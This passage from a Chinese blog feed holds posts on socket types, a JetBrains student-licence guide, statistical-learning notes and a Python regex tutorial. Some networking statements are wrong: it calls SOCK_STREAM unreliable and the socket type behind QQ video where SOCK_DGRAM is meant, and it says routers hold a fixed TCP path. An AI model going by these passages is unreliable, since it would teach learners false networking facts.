Sockets，每个数据包可以选择不同的路径，比如第一个数据包选择路径4，第二个数据包选择路径1，第三个数据包选择路径2…当然，它们也可以选择相同的路径，那也只不过是巧合而已。<br>每个数据包之间都是独立的，各走各的路，谁也不影响谁，除了迷路的或者发生意外的数据包，最后都能到达H6.但是，到达的顺序是不确定的，比如：</p><ul><li>第一个数据包选择了一条比较长的路径（比如路径5），第三个数据包选择了一条比较短的路径（比如路径1），虽然一个数据包很早就出发了，但是走的路比较远，最终还是晚于第三个数据包达到。</li><li>第一个数据包选择了比较短的路径（比如路径1），第三个数据包选择了一条比较长的路径（比如路径5），按理说第一个数据包应该先到达，但是非常不幸，第一个数据包走的路比较拥堵，这条路上的数据量非常大，路由器处理的很慢，所以它还是晚于第三个数据包达到了。</li></ul><p>还有一些意外情况会发生，比如：</p><ul><li>第一个数据包选择了路径1，但是路由器C突然断电了，那他就到不了H6了</li><li>第三个数据包选择了路径2，虽然路不远，但是太拥堵，以至于他等待的时间太长，路由器把它丢弃了。</li></ul><p>总之，对于Datagram Sockets，数据包在传输过程中会发生各种不测，也会发生各种奇迹。H1只负责把数据包发出，至于她什么时候到达，先到达还是后到达，有没有成功到达，H1都不管了；H6也没有选择的权利，只能被动接收，收到什么算什么，爱用不用。</p><p>Datagram Sockets遵循的是【尽最大努力交付】的原则，就是尽力而为，实在做不了也没办法。Datagram Sockets提供的没有质量保证的服务。</p><h3 id="Stream-Sockets"><a href="#Stream-Sockets" class="headerlink" title="Stream Sockets"></a>Stream Sockets</h3><p>Stream Sockets在正式通信之前要先确定一条路径，没有特殊情况的话，以后就固定地使用这条路径来传递数据包了。当然，路径被破坏的话，比如某个路由器断电了，那么就会重新建立路径。<br><img src="/images/%E7%AE%80%E5%8C%96%E4%BA%92%E8%81%94%E7%BD%91%E6%A8%A1%E5%9E%8B2.gif"><br>这条路径是由路由器维护的，路径上所有的路由器都要存储该路径地信息（实际上只需要存储上游和下游两个路由器地位置就行），所以路由器是有开销的。<br>H1和H6通信完毕后，要断开连接，销毁路径，这个时候路由器也会把之前存储的路径信息擦除。</p><p>在很多网络通信教材中，这条预先建立好的路径被称为“虚电路”，就是一条虚拟的通信电路。</p><p>为了保障数据包准确、顺序地到达，发送端在发送数据包后，必须得到接收端地确认才发送下一个数据包；如果数据包发出去了，一段时间以后仍没有得到接收端地回应，那么发送端会重新再发送一次，直到得到接收端的回应。这样一来，发送端发送的所有数据包都能到达接收端，并且是按照顺序到达的。</p><blockquote><p>发送端发送一个数据包，如何得到接收端的确认呢？很简单，为每个数据包分配一个ID，接收端接收到数据包以后，再给发送端返回一个数据包，告诉发送端我接收到了ID为xxxxx的数据包。</p></blockquote><p>Stream Sockets会比Datagram Sockets多出很多数据包，因为发送端每发送一个数据包，接收端就会返回一个数据包。此外，建立连接和断开连接的过程也会传递很多数据包。</p><p>不但是数量多了，每个数据包也变大了：除了源端口和目的端口，Stream Sockets还包括序号、确认信号、数据偏移、控制标志（通常说的URG、ACK、PSH、RST、SYN、FIN）、窗口、检验和紧急指针、选项等信息；Datagram Sockets则只包含长度、校验和信息。</p><p>Stream Sockets的数据包比Datagram Sockets大很多，这意味着更大的负载和更大的带宽。许多即时聊天软件采用UDP协议（Datagram Sockets），与此有莫大的关系。</p><p><strong>总结：</strong></p><blockquote><ul><li>Datagram Sockets传输效率高，但是不可靠，有丢失数据包、捣乱数据的风险</li><li>Stream Sockets非常可靠，万无一失，但是传输效率低，耗费资源多。</li></ul></blockquote><p>两种套接字的特点决定了他们的应用场景，有些服务对可靠性要求比较高，必须数据包能完整无误地送达，那就得选择Stream Sockets（TCP服务），比如HTTP、FTP等；而另一些服务，并不需要那么高的可靠性，效率和实时才是它们所关心的，那就可以选择Datagram Sockets（UDP服务），比如DNS、即时聊天工具等。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
            <tag> socket </tag>
            
            <tag> C语言中文网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转socket（二）</title>
      <link href="/2021/04/21/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2021/04/21/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="套接字有哪些类型？socket有哪些类型？"><a href="#套接字有哪些类型？socket有哪些类型？" class="headerlink" title="套接字有哪些类型？socket有哪些类型？"></a>套接字有哪些类型？socket有哪些类型？</h2><p>这个世界上有很多种套接字（socket），比如DAPRA Internet地址（Internet套接字）、本地节点的路径名（Unix套接字）、CCITT X.25地址（X.25套接字）等。本文只讨论Internet套接字。<br>根据数据的传输方式，可以将Internet套接字分成两种类型（其实还有很多种）。通过socket()函数创建链接时，必须告诉它使用哪种数据传输方式。</p><ul><li>流格式套接字（SOCK_STREAM）</li><li>数据报格式套接字（SOCK_DGRAM）</li></ul><h3 id="Stream-Sockets"><a href="#Stream-Sockets" class="headerlink" title="Stream Sockets"></a>Stream Sockets</h3><p>Stream Sockets也叫 “面向连接的套接字” ，在代码中使用SOCK_STREAM表示。</p><p><strong>Stream Sockets是一种可靠的、双向的通信数据流，数据可以准确无误地到达另一台计算机，如果损坏或丢失，可以重新发送</strong></p><p>Stream Sockets有以下几个特征：</p><ul><li>数据在传输过程中不会消失</li><li>数据是按照顺序传输的</li><li>数据的发送和接收不是同步的（也称“不存在数据边界”）</li></ul><p>可以将Stream Sockets比喻成一条传送带，只要传送带本身没问题（不会断网），就能保证数据不丢失；同时，较晚传输的数据不会先到达，较早传输的数据不会晚到达，这就保证了数据是按照顺序传递的。<br><img src="/images/%E4%BC%A0%E9%80%81%E5%B8%A6.gif"><br>为什么Stream Sockets可以达到高质量的数据传输呢？这是因为它使用了TCP协议（The Transmission Control Protocol，传输控制协议），TCP协议会控制你的数据按照顺序达到并且没有错误。<br>你也许见过TCP，是因为经常听说“TCP/IP”。TCP用来确保数据的正确性，IP（Internet Protocol，网络协议）用来控制数据如何从源头到达目的地，也就是常说的“路由”。</p><p>那么，数据地发送和接收不同步该如何理解呢？</p><p>假设传送带传送的是水果，接收者需要凑齐100个后才能装袋，但是传送带可能把这100个水果分批传送，比如第一批传送20个，第二批传送50个，第三批传送30个。接收者不需要和传送带保持同步，只要根据自己的节奏来装袋即可。<br>不用管传送带传送了几批，也不用每到一批就装袋一次，可以等到凑够了100个水果再装袋。</p><p>Stream Sockets地内部有提个缓冲区（也就是字符数组），通过socket传输的数据将保存到这个缓冲区。接收端再收到数据后并不一定立即读取，只要数据不超过缓冲区容量，接收端有可能在缓冲区被填满以后一次性读取，也可能分好几次读取。</p><p>也就是说，不管数据分几次传送过来，接收端只需要根据自己的要求读取，不用非得在数据达到时立即读取。传送端有自己的节奏，接收端也有自己的节奏，他们是不一致的。</p><p>Stream Sockets有什么实际的应用场景吗？浏览器所使用的http协议就基于Stream Sockets，因为必须要保证数据准确无误，否则加载的HTML将无法解析。</p><h3 id="Datagram-Sockets"><a href="#Datagram-Sockets" class="headerlink" title="Datagram Sockets"></a>Datagram Sockets</h3><p>Datagram Sockets也叫“无连接的套接字”，在代码中使用SOCK_DGRAM表示。</p><p>计算机只管传输数据，不做数据校验，如果数据在传输中损坏，或者没有达到另一台计算机，是没有办法补救的。也就是说，数据错了就错了，无法重传。</p><p>因为Datagram Sockets所做的校验工作少，所以在传输效率方面比Stream Sockets高。可以将Datagram Sockets比喻成高速移动的摩托车快递，它有以下特征：</p><ul><li>强调快速传输而非传输顺序</li><li>传输的数据可能丢失也可能损毁</li><li>限制每次传输的数据大小</li><li>数据的发送和接受是同步的（也称“存在数据边界”）</li></ul><p>众所周知，速度是快递行业的生命。用摩托车发往同一地点的两件包裹无需保证顺序，只要以最快的速度叫个客户就好。这种方式存在损坏或丢失的风险，而且包裹大小有一定的限制。因此，想要传递大量包裹，就得分配发送。<br><img src="/images/%E6%91%A9%E6%89%98%E8%BD%A6%E5%BF%AB%E9%80%92.jpg"><br>另外，用摩托车分别发送两件包裹，那么接收者也需要分两次接收，所以“数据的发送和接收是同步的”，换句话说，接受次数和发送次数相同。<br><strong>总之，SOCK_STREAM是一种不可靠的、不按顺序传输的、以追求速度为目的的套接字</strong></p><p>Datagram Sockets也使用IP协议作路由，但是它不使用TCP协议，而是使用UDP（User Datagram Protocol，用户数据协议）。</p><p>QQ视频聊天和语音聊天就使用SOCK_STREAM来传送数据，因为首先要保证通信的效率，尽量减少延迟，而数据的正确性是次要的，即使丢失很小的一部分数据，视频和音频也可以正常解析，最多出现噪点或杂音，不会对通信质量有实质的影响。</p><blockquote><p>Datagram Sockets没有想象中的糟糕，不会频繁的丢失数据，数据错误只是小概率事件。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
            <tag> socket </tag>
            
            <tag> C语言中文网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转socket（一）</title>
      <link href="/2021/04/21/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/04/21/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是socket？"><a href="#什么是socket？" class="headerlink" title="什么是socket？"></a>什么是socket？</h3><p>socket的原意是“插座”，在计算机通信领域，socket被翻译成“套接字”，它是计算机之间进行通信的一种约定或一种方式。<br>通过socket这种约定，一台计算机可以接收其他计算机的数据，也可以向其他计算机发送数据。</p><p>把充电器插头插到插座上就能从电网获取电力供应给手机充电，同样的，为了与远程计算机进行数据传输，需要连接到互联网，而<br>socket就是用来连接到互联网的工具。</p><p>socket的典型应用就是Web服务器和浏览器：浏览器获取用户输入的URL，向服务器发起请求，服务器分析接收到的URL，将对应的网页的内容<br>返回给浏览器，浏览器再经过解析和渲染，就将文字、图片、视频等元素呈现给用户。</p><h3 id="UNIX-Linux中的socket是什么？"><a href="#UNIX-Linux中的socket是什么？" class="headerlink" title="UNIX/Linux中的socket是什么？"></a>UNIX/Linux中的socket是什么？</h3><p>在UNIX/Linux系统中，为了统一对各种硬件的操作，简化接口，不同的硬件设备也都被看成一个文件。对这些文件的操作，等同于对磁盘上普通文件<br>的操作。</p><p><strong>UNIX/Linux中的一切都是文件</strong></p><p>为了表示和区分已经打开的文件，UNIX/Linux会给每个文件分配一个ID，这个ID就是一个整数，被称为文件描述符。例如：</p><ul><li>通常用0来表示标准输入文件（stdin），它对应的硬件设备就是键盘；</li><li>通常用1来表示标准输出文件（stdout），它对应的硬件设备就是显示器。</li></ul><p>UNIX/Linux程序在执行任何形式的I/O操作时，都是在读取或写入一个文件描述符。一个文件描述符只是一个和打开的文件相关联的整数，它的背后可能<br>是一个硬盘上的普通文件、FIFO、管道，终端键盘、显示器，甚至是一个网络连接。</p><p><strong>网络链接也是一个文件，它也有文件描述符！</strong></p><p>我们可以通过socket()函数来创建一个网络连接，或者说打开一个网络文件，socket()的返回值就是文件描述符。有了文件描述符，我们就可以使用普通的文件操作函数来传输数据了，例如：</p><ul><li>用read()读取从远程计算机传来的数据</li><li>用write()向远程计算机写入数据。</li></ul><h3 id="Windows系统中的socket是什么？"><a href="#Windows系统中的socket是什么？" class="headerlink" title="Windows系统中的socket是什么？"></a>Windows系统中的socket是什么？</h3><p>Windows也有类似“文件描述符”的概念，但通常被称为“文件句柄”。与UNIX/Linux不同的是，Windows会区分socket和文件，Windows就把socket当作一个网络链接来对待，因此需要调用专门针对<br>socket而设计的数据传输函数，针对普通文件的输入输出函数就无效了。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
            <tag> socket </tag>
            
            <tag> C语言中文网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HNUST之学子如何免费使用pycharm等jetbrains系列工具</title>
      <link href="/2021/04/19/HNUST%E4%B9%8B%E5%AD%A6%E5%AD%90%E5%A6%82%E4%BD%95%E5%85%8D%E8%B4%B9%E4%BD%BF%E7%94%A8pycharm%E7%AD%89jetbrains%E7%B3%BB%E5%88%97%E5%B7%A5%E5%85%B7/"/>
      <url>/2021/04/19/HNUST%E4%B9%8B%E5%AD%A6%E5%AD%90%E5%A6%82%E4%BD%95%E5%85%8D%E8%B4%B9%E4%BD%BF%E7%94%A8pycharm%E7%AD%89jetbrains%E7%B3%BB%E5%88%97%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="湖南科大学子如何免费使用jetbrains系列开发工具"><a href="#湖南科大学子如何免费使用jetbrains系列开发工具" class="headerlink" title="湖南科大学子如何免费使用jetbrains系列开发工具"></a>湖南科大学子如何免费使用jetbrains系列开发工具</h3><p>实际上这种方法各高校普适，但本文只针对湖南科大学子。<br>我们以pycharm为例。</p><h4 id="1-进入学生申请网址"><a href="#1-进入学生申请网址" class="headerlink" title="1.进入学生申请网址"></a>1.进入学生申请网址</h4><p><a href="https://www.jetbrains.com/zh/student/">点我白嫖</a></p><h4 id="2-填写信息"><a href="#2-填写信息" class="headerlink" title="2.填写信息"></a>2.填写信息</h4><p>点击立即申请<br><img src="/images/%E7%99%BD%E5%AB%961.png"><br>信息如实填写，最重要的步骤是把学校的邮箱写进去。<br><img src="/images/%E9%AA%8C%E8%AF%81%E9%82%AE%E7%AE%B1.png"><br>那么如何申请科大的邮箱呢？</p><ul><li>打开微信</li><li>打开湖南科技大学企业号<br><img src="/images/%E6%B9%96%E5%8D%97%E7%A7%91%E5%A4%A7%E4%BC%81%E4%B8%9A%E5%8F%B7.jpg"></li><li>打开网络信息服务<br><img src="/images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E6%9C%8D%E5%8A%A1.jpg"></li><li>进入科大邮箱服务<br><img src="/images/%E9%82%AE%E7%AE%B1%E6%9C%8D%E5%8A%A1.jpg"></li><li>申请邮箱</li><li>更改密码<br>完成如上步骤后，我们就拥有了科大邮箱。<strong>邮箱地址为：学号@mail.hnust.edu.cn</strong><br>申请完后，如实填写邮箱地址，然后进行申请。<br>申请后，官网会向我们申请的科大邮箱发一份邮件，进行验证。<br>此时我们需要打开腾讯企业邮箱，输入邮箱地址和密码，进入验证。<br><img src="/images/%E6%9C%80%E5%90%8E%E4%B8%80%E6%AD%A5.png"><br>大功告成！！！<h4 id="3-打开软件，开始白嫖"><a href="#3-打开软件，开始白嫖" class="headerlink" title="3.打开软件，开始白嫖"></a>3.打开软件，开始白嫖</h4></li></ul><p><img src="/images/%E5%A4%A7%E5%8A%9F%E5%91%8A%E6%88%90.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学生党 </tag>
            
            <tag> 白嫖 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>统计学习方法之监督学习（二）</title>
      <link href="/2021/04/18/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E4%B9%8B%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2021/04/18/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E4%B9%8B%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="统计学习的分类"><a href="#统计学习的分类" class="headerlink" title="统计学习的分类"></a>统计学习的分类</h3><p>统计学习或机器学习是一个范围宽阔、内容繁多、应用广泛的领域，并不存在（至少现在不存在）一个统一的理论体系涵盖所有内容。下面从几个角度对统计学习方法进行分类。</p><h4 id="基本分类"><a href="#基本分类" class="headerlink" title="基本分类"></a>基本分类</h4><h5 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h5><p>监督学习是指从标注数据中学习预测模型的机器学习的问题。标注数据表示输入输出的对应关系，预测模型对给定的输入产生相应的输出。<strong>监督学习的本质是学习输入到输出的映射的统计规律</strong></p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 统计学习方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>统计学习方法之监督学习（一）</title>
      <link href="/2021/04/18/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E4%B9%8B%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/04/18/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E4%B9%8B%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="统计学习"><a href="#统计学习" class="headerlink" title="统计学习"></a>统计学习</h3><h4 id="统计学习的特点"><a href="#统计学习的特点" class="headerlink" title="统计学习的特点"></a>统计学习的特点</h4><p>统计学习是关于计算机基于数据构建概率统计模型并运用模型对数据进行预测与分析的一门学科。<br>统计学习也称为统计机器学习。<br>= =。看了上面的定义，是不是觉得一团浆糊呢。但其实说的已经很清楚了，在这里我用自己的话总结一下。<br><strong>统计学习就是用数据建模型，再用建出来的模型对数据进行分析和预测的一个看起来高大上实则学起来也就那么回事的一门学科。</strong></p><p>统计学习有诸多特点，在这里作简单概括：</p><ul><li>统计学习以计算机和网络为平台，是建立在计算机和网络上的</li><li><strong>统计学习以数据为研究对象，是数据驱动的学科</strong></li><li><strong>统计学习的目的是对数据进行预测与分析</strong></li><li>统计学习以方法为中心，统计学习方法构建模型并应用模型进行预测与分析</li><li>统计学习是概率论、统计学、信息论、计算理论、最优化理论及计算机科学等多个领域的交叉学科。并且在发展中逐步形成独自的理论体系与方法论。</li></ul><h4 id="统计学习的对象"><a href="#统计学习的对象" class="headerlink" title="统计学习的对象"></a>统计学习的对象</h4><p>统计学习的研究对象是<strong>数据</strong>。它从数据出发，提取数据的特征，抽象出数据的模型，发现数据中的知识，又回到对数据的分析与预测中去。<br><strong>统计学习关于数据的基本假设是同类数据具有一定的统计规律，这是统计学习的前提</strong></p><h4 id="统计学习的目的"><a href="#统计学习的目的" class="headerlink" title="统计学习的目的"></a>统计学习的目的</h4><p>统计学习用于<strong>对数据的预测与分析</strong>，特别是对未知新数据的预测与分析。对数据的预测与分析是通过构建概率统计模型实现的。</p><h4 id="统计学习的方法"><a href="#统计学习的方法" class="headerlink" title="统计学习的方法"></a>统计学习的方法</h4><p>统计学习的方法可以概括如下：</p><ul><li>从给定的、有限的、用于学习的训练数据集合出发，假设数据是独立同分布产生的</li><li>并且假设要学习的模型属于某个函数的集合，称为假设空间({f1,f2,f3,…,fn})</li><li>应用某个评价准则，从假设空间选取一个最优模型，使它对已知的训练数据及未知的测试数据在给定的评价准则下有最优的预测</li><li>最优模型由算法实现</li></ul><p>如此可知，统计学习方法包括<strong>模型的假设空间、模型选择的准则、模型学习的算法</strong>，简称为‘模型’，‘策略’，‘算法’。</p><p>实现统计学习方法的步骤如下：</p><ol><li>得到一个有限的训练数据集合</li><li>确定包含所有可能的模型的假设空间，即学习模型的集合</li><li>确定模型选择的准则，即学习的策略</li><li>实现求解最优模型的算法，即学习的算法</li><li>通过学习方法选择最优模型</li><li>利用学习的最优模型对新数据进行预测和分析</li></ol><p>= =。就先写到这里，这算对统计学习做了一个简单的概述，大致看一下即可。</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 统计学习方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python之正则表达式</title>
      <link href="/2021/04/16/python%E4%B9%8B%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2021/04/16/python%E4%B9%8B%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="学习基础：Python之正则表达式-引用runoob的正则表达式篇"><a href="#学习基础：Python之正则表达式-引用runoob的正则表达式篇" class="headerlink" title="学习基础：Python之正则表达式(引用runoob的正则表达式篇)"></a>学习基础：Python之正则表达式(引用runoob的正则表达式篇)</h3><p>正则表达式是一个特殊的字符序列，它能方便我们检查一个字符串是否与某种模式匹配。<br>Python的re模块使Python语言拥有全部的正则表达式功能。</p><h4 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a>re.match函数</h4><p>re.match函数尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。<br><strong>函数语法：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">re.match(pattern, string, flags=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><strong>函数参数说明：</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>pattern</td><td>匹配的正则表达式</td></tr><tr><td>string</td><td>要匹配的字符串</td></tr><tr><td>flags</td><td>标志位，用于控制正则表达式的匹配方式</td></tr></tbody></table><p>匹配成功re.match方法返回一个匹配的对象，否则返回None。<br>可以使用group（num）或groups（）匹配对象函数来获取匹配表达式。</p><table><thead><tr><th>匹配对象方法</th><th>描述</th></tr></thead><tbody><tr><td>group（num=0）</td><td>匹配的整个表达式的字符串，group（）可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组</td></tr><tr><td>groups（）</td><td>返回一个包含所有小组字符串的元组，从1到所含的小组号</td></tr></tbody></table><p><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">import</span> re<br>print(re.match(<span class="hljs-string">&#x27;www&#x27;</span>,<span class="hljs-string">&#x27;www.youtube.com&#x27;</span>).span()) <span class="hljs-comment">#在起始位置匹配</span><br>print(re.match(<span class="hljs-string">&#x27;com&#x27;</span>,<span class="hljs-string">&#x27;www.youtube.com&#x27;</span>)) <span class="hljs-comment">#不在起始位置匹配</span><br></code></pre></td></tr></table></figure><p><strong>以上实例运行输出结果为:</strong></p><blockquote><p>(0,3)<br>None</p></blockquote><p><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> re<br><br>line = <span class="hljs-string">&quot;Cats are smarter than dogs&quot;</span><br><span class="hljs-comment"># .*表示任意匹配除换行符（\n,\r）之外的任何单个或多个字符</span><br><span class="hljs-comment"># (.*?)表示“非贪婪”模式，只保存第一个匹配到的子串</span><br>matchObj = re.match(<span class="hljs-string">r&#x27;(.*) are (.*?) .*&#x27;</span>,line,re.M|re.I)<br><span class="hljs-keyword">if</span> matchObj:<br>print(<span class="hljs-string">&quot;matchObj.group():&quot;</span>,matchObj.group())<br>print(<span class="hljs-string">&quot;match.group(1):&quot;</span>,matchObj.group(<span class="hljs-number">1</span>))<br>print(<span class="hljs-string">&quot;match.group(2):&quot;</span>,matchObj.group(<span class="hljs-number">2</span>))<br><span class="hljs-keyword">else</span>:<br>print(<span class="hljs-string">&quot;No match!&quot;</span>)<br></code></pre></td></tr></table></figure><p>以上实例执行结果如下：</p><blockquote><p>matchObj.group(): Cats are smarter than dogs<br>matchObj.group(1):Cats<br>matchObj.group(2):smarter</p></blockquote><h4 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a>re.search方法</h4><p>re.search扫描整个字符串并返回第一个成功的匹配<br><strong>函数语法：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">re.search(pattern, string, flags=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><strong>函数参数说明：</strong><br>同re.match<br><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-keyword">import</span> re<br> <br>print(re.search(<span class="hljs-string">&#x27;www&#x27;</span>, <span class="hljs-string">&#x27;www.youtube.com&#x27;</span>).span())  <span class="hljs-comment"># 在起始位置匹配</span><br>print(re.search(<span class="hljs-string">&#x27;com&#x27;</span>, <span class="hljs-string">&#x27;www.youtube.com&#x27;</span>).span())  <span class="hljs-comment"># 不在起始位置匹配</span><br></code></pre></td></tr></table></figure><p><strong>以上实例运行输出结果为：</strong></p><blockquote><p>(0,3)<br>(12,15)<br><strong>实例：</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-keyword">import</span> re<br> <br>line = <span class="hljs-string">&quot;Cats are smarter than dogs&quot;</span><br> <br>searchObj = re.search( <span class="hljs-string">r&#x27;(.*) are (.*?) .*&#x27;</span>, line, re.M|re.I)<br> <br><span class="hljs-keyword">if</span> searchObj:<br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;searchObj.group() : &quot;</span>, searchObj.group())<br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;searchObj.group(1) : &quot;</span>, searchObj.group(<span class="hljs-number">1</span>))<br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;searchObj.group(2) : &quot;</span>, searchObj.group(<span class="hljs-number">2</span>))<br><span class="hljs-keyword">else</span>:<br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Nothing found!!&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>以上实例运行输出结果为：</strong></p><blockquote><p>searchObj.group() :  Cats are smarter than dogs<br>searchObj.group(1) :  Cats<br>searchObj.group(2) :  smarter</p></blockquote><h4 id="re-match与re-search的区别"><a href="#re-match与re-search的区别" class="headerlink" title="re.match与re.search的区别"></a>re.match与re.search的区别</h4><p>re.match 只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回 None，而 re.search 匹配整个字符串，直到找到一个匹配。<br><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-keyword">import</span> re<br> <br>line = <span class="hljs-string">&quot;Cats are smarter than dogs&quot;</span><br> <br>matchObj = re.match( <span class="hljs-string">r&#x27;dogs&#x27;</span>, line, re.M|re.I)<br><span class="hljs-keyword">if</span> matchObj:<br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;match --&gt; matchObj.group() : &quot;</span>, matchObj.group())<br><span class="hljs-keyword">else</span>:<br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;No match!!&quot;</span>)<br> <br>matchObj = re.search( <span class="hljs-string">r&#x27;dogs&#x27;</span>, line, re.M|re.I)<br><span class="hljs-keyword">if</span> matchObj:<br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;search --&gt; matchObj.group() : &quot;</span>, matchObj.group())<br><span class="hljs-keyword">else</span>:<br>   <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;No match!!&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>以上实例运行结果如下：</strong></p><blockquote><p>No match!!<br>search –&gt; matchObj.group() :  dogs</p></blockquote><h4 id="检索和替换"><a href="#检索和替换" class="headerlink" title="检索和替换"></a>检索和替换</h4><p>Python 的re模块提供了re.sub用于替换字符串中的匹配项。<br><strong>语法：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">re.sub(pattern, repl, string, count=<span class="hljs-number">0</span>, flags=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>pattern : 正则中的模式字符串。</li><li>repl : 替换的字符串，也可为一个函数。</li><li>string : 要被查找替换的原始字符串。</li><li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li><li>flags : 